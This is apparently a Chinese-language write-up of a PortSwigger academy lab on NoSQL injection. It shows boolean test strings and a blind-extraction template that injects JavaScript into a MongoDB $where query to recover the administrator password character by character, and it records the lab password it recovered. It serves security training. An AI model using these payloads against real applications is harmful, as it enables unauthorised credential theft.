---
title: "lab-nosql-injection-extract-data"
---

# lab-nosql-injection-extract-data

PortSwigger academy, NoSQL injection 族。目标：取出 `administrator` 口令后登录。

## 靶面

- `GET /user/lookup?user=<input>` 返回 JSON `{"username","email","role"}`，未命中返回 `{"message":"Could not find user"}`。
- 服务端把输入拼进 MongoDB `$where` 的 `this.username == '<input>'`；输入自带引号即可闭合，尾引号由服务端补齐。
- 口径：`wiener' && '1'=='1` 回 wiener 记录，`wiener' && '1'=='2` 回未命中，布尔 oracle 成立。

## 判据锚

- 真值串 = 响应体含 `username`；假值串 = `Could not find user`。

## 提取

`blind_oracle <base>/user/lookup --template "administrator' && this.password[{I}-1]=='{C}' || 'a'=='b" --true username --place query:user --jar <jar>`

- 末尾 `|| 'a'=='b` 保证假分支不落语法错，稳定回未命中。
- `{I}` 是 1 起的连续序号，Mongo 字符串 0 起索引，故模板写 `{I}-1`（本件位序与下标不同源的唯一补丁点）。
- 结果：口令 `vlaxwanh`（8 位，第 9 位无命中即止）；`administrator:vlaxwanh` 登录后横幅翻牌。

## 要点

- 同族 [[blind-injection-family]]：条件响应型 oracle 的读法一致，差别只在模板语义（JS/`$where` 而非 SQL）。
- 判定前先做真/假对照，不要直接开扫：拼串闭合方式（引号是否被服务端补齐）决定模板能不能成立。
- 校验终止位：`terminated=true` 且 `transport_errors_after_retry=0` 才算提取闭口。
